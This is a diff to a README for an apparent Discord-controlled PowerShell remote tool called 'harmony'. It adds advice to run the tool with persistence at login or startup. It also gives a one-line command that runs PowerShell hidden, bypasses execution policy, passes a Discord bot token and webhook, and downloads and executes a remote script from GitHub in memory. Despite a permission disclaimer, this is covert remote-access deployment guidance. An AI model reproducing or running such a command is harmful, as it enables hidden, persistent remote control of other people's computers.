@@ -4,7 +4,7 @@ A PowerShell rewrite of the original Python code, designed to run directly in me
 
 ### **Usage Instructions:**
 
-To execute the script, run the following command on the remote computer you own or have permission to run this on, making sure to replace the placeholders with your own Discord Bot Token, Server ID, and Webhook URL:
+To execute the script, run the following command (preferably with persistence for automatic execution, such as a batch file or similar method at login or startup) on the remote computer you own or have permission to use, ensuring you replace the placeholders with your own Discord Bot Token, Server ID, and Webhook URL:
 
 ```powershell
 powershell -W Hidden -EP Bypass -C "$TOKEN='<YOUR_BOT_TOKEN>';$serverID='<YOUR_SERVER_ID>';$whURL='<YOUR_WEBHOOK_URL>';IEX(IWR'https://raw.githubusercontent.com/olivia1246/harmony/refs/heads/powershell/harmony.ps1'-UseBasicParsing);exit"
